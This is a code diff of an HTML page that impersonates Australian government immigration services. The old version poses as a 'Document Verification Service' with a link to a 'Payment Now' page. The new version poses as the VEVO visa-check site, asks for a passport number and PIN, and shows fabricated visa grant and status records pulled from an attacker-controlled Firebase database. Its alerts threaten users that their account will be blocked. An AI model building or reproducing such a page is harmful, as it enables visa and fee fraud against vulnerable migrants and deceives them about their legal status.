@@ -3,79 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Verification Service Assistance - Immigration and citizenship</title>
+    <title>Check visa conditions online My-VEVO - Check Australian Government</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44ncz8e5z/44nd5m7sn/13898.png">
     <style>
-        :root { --navy: #002d5a; --blue: #0056b3; --green: #28a745; --red: #dc3545; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; padding: 15px; }
-        .card { max-width: 420px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
-        .header { background: var(--navy); color: white; padding: 40px; text-align: center; }
-        .header i { font-size: 25px; margin-bottom: 10px; }
-        .content { padding: 15px; }
-        label { font-size: 18px; font-weight: 600; color: #444; margin-bottom: 8px; display: block; }
-        input, select { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
-        .btn-check { width: 100%; background: var(--blue); color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        :root { --navy: #003066; --blue-btn: #0056b3; --gray-bg: #f4f7f9; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--gray-bg); margin: 0; padding: 0; }
+        .top-banner { background: var(--navy); color: white; text-align: center; padding: 20px; position: relative; }
+        .logo-img { width: 280px; filter: brightness(0) invert(1); margin-bottom: 5px; }
+        .container { max-width: 450px; margin: 25px auto; background: white; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); overflow: hidden; }
+        .header-text { background: white; color: var(--navy); padding: 15px; font-weight: bold; border-bottom: 1px solid #ddd; text-align: center; font-size: 18px; }
+        .content { padding: 20px; }
+        .field { margin-bottom: 15px; }
+        label { display: block; font-size: 15px; font-weight: 600; margin-bottom: 8px; color: #333; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 15px; }
+        .radio-grp { display: flex; gap: 20px; padding: 10px 0; }
+        .btn-main { width: 100%; background: var(--blue-btn); color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+
+        /* Result View Styles */
+        #resultView { display: none; padding: 20px; background: #fff; }
+        .info-box { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #eee; }
+        .lbl { color: #666; font-size: 12px; text-transform: uppercase; font-weight: bold; }
+        .val { color: #003066; font-size: 14px; font-weight: 600; text-align: right; }
+        .entries-box { background: #f0f7ff; padding: 15px; border-radius: 8px; border-left: 4px solid #0056b3; margin-top: 15px; }
         
-        #resultView { display: none; padding: 20px; animation: fadeIn 0.5s; }
-        .status-box { text-align: center; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-weight: bold; font-size: 18px; }
-        .paid { background: #e8f5e9; color: var(--green); border: 1px solid var(--green); }
-        .not-paid { background: #fff3e0; color: #ef6c00; border: 1px solid #ef6c00; }
-        
-        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px dotted #ccc; font-size: 14px; }
-        .val { font-weight: bold; color: #333; }
-        .btn-pay { display: block; background: var(--green); color: white; text-align: center; text-decoration: none; padding: 15px; border-radius: 8px; margin-top: 20px; font-weight: bold; }
-        .btn-close { width: 100%; background: #eee; color: #333; border: none; padding: 12px; border-radius: 8px; margin-top: 10px; cursor: pointer; font-weight: 600; }
-        
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .status-table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #ddd; }
+        .status-table th { background: #003066; color: white; padding: 12px; text-align: left; font-size: 12px; }
+        .status-table td { padding: 12px; border: 1px solid #ddd; font-size: 13px; background: #fafafa; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="header">
-<a href="https://immi-accountvisaapplications.vercel.app/" target="_blank" style="display:block;">
-  <img src="https://uploads.onecompiler.io/44ggv5rcj/44gha2js7/9468.png"  alt="aud" 
-       style="width:80%; height:auto;">
-</a>
+<div class="top-banner">
+    <img src="https://uploads.onecompiler.io/44ggv5rcj/44ggv6n9r/9318.png" class="logo-img">
+    <h3>Welcome to My-VEVO</h3>
+   <p style="font-size: 15px; opacity: 1.8;">Check Your Current Australian visa. Expiry date and Travel Conditions.</p>
+   <p style="font-size: 10px; opacity: 0.8;">Visa Entitlement Verification Online (VEVO) allows visa holders, employers, education providers and other organisations to check visa details and conditions.</p>
+</div>
 
+<div class="container">
+    <div id="formSection">
+        <div class="header-text">My Travel Details</div>
+        <div class="content">
+            <div class="field"><label>Passport Issuing Country</label><select id="country"><option>BANGLADESH</option><option>INDIAN</option><option>PAKISTAN</option><option>SOUTH KOSOVO</option><option>KUWAIT</option>
+             <option>KYRGYZSTAN</option><option>LAO PEOPLE'S</option><option>DEMOCRATIC REPUBLIC LATVIA</option><option>LEBANON</option><option>LESOTHO</option><option>LIBERIA</option><option>LIBYA</option><option>LIECHTENSTEIN</option>
+             <option>LITHUANIA</option><option>LUXEMBOURG</option><option>MEXICO</option><option>MICRONESIA,</option><option>FEDERATED STATES OFMOLDOVA</option><option>REPUBLIC OFMONACO</option><option>MONGOLIA</option><option>MONTENEGRO</option>
+             <option>MONTSERRAT</option><option>MOROCCO</option><option>MOZAMBIQUE</option><option>NAMIBIA</option><option>NAURU</option><option>NEPAL</option><option>NORFOLK ISLAND</option><option>NORTH MACEDONIA</option>
+             <option>NORTHERN MARIANA ISLNORWAY</option><option>OMAN</option><option>PALAU</option><option>PALESTINE, STATE OFPANAMA</option><option>PAPUA NEW GUINEA</option><option>PARAGUAYPERU</option><option>PHILIPPINES</option>
+             <option>PITCAIRN</option><option>POLAND</option></option>PORTUGAL</option><option>PUERTO RICO</option<option>REFUGEE AS PER ART</option><option>REFUGEE OTHER</option><option>REUNION</option><option>ROMANIA</option>
+             <option>ROMANIA PRE</option><option>RUSSIAN FEDERATION</option><option>RWANDA SAINT HELENA,</option><option>MONTENEGRO</option><option>SEYCHELLES</option><option>SIERRA LEONE</option></select></div>
+           
+            <div class="field"><label>Passport Number</label><input type="text" id="passNum" placeholder="Enter Passport Number"></div>
+            <div class="field"><label>Are you an Australian Resident?</label>
+                <div class="radio-grp"><span><input type="radio" name="res" value="Yes"> Yes</span><span><input type="radio" name="res" value="No" checked> No</span></div>
+            </div>
+            <div class="field"><label>Departure Date (DD/MM/YYYY)</label><input type="text" id="depDate" placeholder="dd/mm/yyyy"></div>
+            <button class="btn-main" onclick="showPinScreen()">VEVO CHECK</button>
+        </div>
     </div>
-    
-    <div class="content" id="inputBox">
-     <h3>Employer Document Verification Service Assistance,</h3>
-      <p>• The Document Verification Service (TSS) is a joint initiative of the Australian Government and State and Territory Governments,</p>
-      <p>• The Document Verification Service (TSS) is a joint initiative of the Australian Government and State and Territory Governments,</p>
-        <label><i class="fas fa-passport"></i> Passport/Ref Number:</label>
-        <input type="text" id="userPass" placeholder="Enter Passport Number">
-        
-        <label><i class="fas fa-list"></i> Employer Document Type:</label>
-        <select id="userType">
-            <option>Application Status</option><option>Employer Jobs Status</option><option>Biometric Rrequired Submit</option>
-            <option>Manpower Status</option><option>Work permit Status</option><option>E-Visa Status</option>
-            <option>Certificate (NOC) From Employer Status</option><option>Financial Bank statements Summit</option>
-        </select>
-        <button class="btn-check" onclick="checkData()">Verification Status</button>
+
+    <div id="pinSection" style="display:none; text-align:center; padding: 40px 20px;">
+        <h2 style="color: var(--navy);">My-VEVO</h2>
+        <p style="color: #666; font-size: 14px;">Enter 4 Digit PIN</p>
+        <input type="password" id="pinInput" maxlength="4" style="width: 150px; text-align: center; font-size: 30px; letter-spacing: 10px; border: none; border-bottom: 2px solid var(--navy); outline: none;">
+        <button class="btn-main" style="margin-top: 30px;" onclick="verifyData()">Verify PIN</button>
     </div>
 
     <div id="resultView">
-        <div id="statusBadge" class="status-box"></div>
+        <div class="info-box"><div class="lbl">Family name</div><div class="val" id="resFamilyName">---</div></div>
+        <div class="info-box"><div class="lbl">Visa description</div><div class="val" id="resVisaDesc">---</div></div>
+        <div class="info-box"><div class="lbl">Document number</div><div class="val" id="resDocNum">---</div></div>
+        <div class="info-box"><div class="lbl">Visa class/subclass</div><div class="val" id="resVisaClass">---</div></div>
+        <div class="info-box"><div class="lbl">Visa grant Date</div><div class="val" id="resGrantDate" style="color: green;">---</div></div>
+        <div class="info-box"><div class="lbl">Visa expiry Date</div><div class="val" id="resExpiryDate" style="color: red;">---</div></div>
+
+        <div class="entries-box">
+            <div class="lbl" style="color: #003066; margin-bottom: 5px;">Entries allowed</div>
+            <div style="font-size: 13px; color: #444; line-height: 1.4;">
+                Multiple entries to and from Australia during the validity of your visa
+            </div>
+        </div>
         
-        <div class="info-row"><span>Employer:</span> <span id="rEmp" class="val"></span></div>
-        <div class="info-row"><span>Passport:</span> <span id="rPass" class="val"></span></div>
-        <div class="info-row"><span>Type:</span> <span id="rType" class="val"></span></div>
-        <div class="info-row"><span>Date:</span> <span id="rDate" class="val"></span></div>
-        <div class="info-row"><span>Amount:</span> <span id="rCurr" class="val"></span></div>
+        <table class="status-table">
+            <thead><tr><th>Status</th><th>Date</th><th>Time</th></tr></thead>
+            <tbody><tr><td id="resStatus" style="font-weight: bold; color: green;">---</td><td id="resDate">---</td><td id="resTime">---</td></tr></tbody>
+        </table>
         
-        <a href="https://best-payment-gateways-international.vercel.app/" id="payBtn" class="btn-pay">Payment Now</a>
-        <button class="btn-close" onclick="location.reload()">Close & Refresh</button>
+        <button class="btn-main" style="background: green; margin-top: 25px;" onclick="location.reload()">Close VEVO Check</button>
     </div>
 </div>
-<a href="https://immi-accountvisaapplications.vercel.app/" target="_blank" style="display:block;">
-  <img src="https://uploads.onecompiler.io/44db59mje/44ekfykza/1000210379.jpg"  alt="aud" 
-       style="width:100%; height:auto;">
-</a>
+
 <script>
+    // Firebase Config (Keep your existing one)
     const firebaseConfig = {
         apiKey: "AIzaSyDgiL1iFUfbs1iaP6v_YPadbn49eiku1WE",
         databaseURL: "https://webpagecybersecurity-default-rtdb.firebaseio.com",
@@ -84,33 +104,40 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function checkData() {
-        const pass = document.getElementById('userPass').value;
-        const type = document.getElementById('userType').value;
-        if(!pass) return alert("পাসপোর্ট এবং রেফারেন্স নাম্বার দিন");
+    function showPinScreen() {
+        if(!document.getElementById('passNum').value) return alert("The Passport No is incorrect, please enter the correct Passport. Otherwise your account will be blocked.");
+        document.getElementById('formSection').style.display = 'none';
+        document.getElementById('pinSection').style.display = 'block';
+    }
 
-        db.ref('fee_payments/' + pass).once('value').then((snapshot) => {
+    function verifyData() {
+        const pass = document.getElementById('passNum').value.trim();
+        const pin = document.getElementById('pinInput').value.trim();
+
+        db.ref('visas/' + pass).once('value').then((snapshot) => {
             const data = snapshot.val();
-            if(data && data.type === type) {
-                document.getElementById('inputBox').style.display = 'none';
+            if(data && data.pin == pin) {
+                document.getElementById('pinSection').style.display = 'none';
                 document.getElementById('resultView').style.display = 'block';
                 
-                document.getElementById('rEmp').innerText = data.employer;
-                document.getElementById('rPass').innerText = pass;
-                document.getElementById('rType').innerText = data.type;
-                document.getElementById('rDate').innerText = data.pay_date;
-                document.getElementById('rCurr').innerText = data.currency;
-
-                const badge = document.getElementById('statusBadge');
-                if(data.status === "Paid") {
-                    badge.innerHTML = "✅ Paid Successfully";
-                    badge.className = "status-box paid";
-                    document.getElementById('payBtn').style.display = 'none';
-                } else {
-                    badge.innerHTML = "⌛ Not Paid, Qickly Complete the Payment within this Time. ";
-                    badge.className = "status-box not-paid";
-                }
-            } else { alert("আপনার ডকুমেন্ট বাছাই, তথ্য সঠিক নয়! অনুগ্রহ করে সঠিক তথ্য দিয়ে আবার চেষ্টা করুন!"); }
+                // এখানে আপনার ডাটাবেসের ফিল্ড অনুযায়ী নামগুলো বসান
+                document.getElementById('resFamilyName').innerText = data.family_name || "---";
+                document.getElementById('resVisaDesc').innerText = data.visa_desc || "---";
+                document.getElementById('resDocNum').innerText = data.doc_num || pass;
+                document.getElementById('resVisaClass').innerText = data.visa_class || "---";
+                document.getElementById('resGrantDate').innerText = data.grant_date || "---";
+                document.getElementById('resExpiryDate').innerText = data.expiry_date || "---";
+                
+                // স্ট্যাটাস টেবিল
+                document.getElementById('resStatus').innerText = data.status || "---";
+                document.getElementById('resDate').innerText = data.date || "---";
+                document.getElementById('resTime').innerText = data.time || "---";
+            } else { 
+                alert("The PIN is incorrect, please enter the correct PIN. Otherwise your account will be blocked."); 
+            }
+        }).catch(err => {
+            console.error(err);
+            alert("Check your internet and try again.");
         });
     }
 </script>
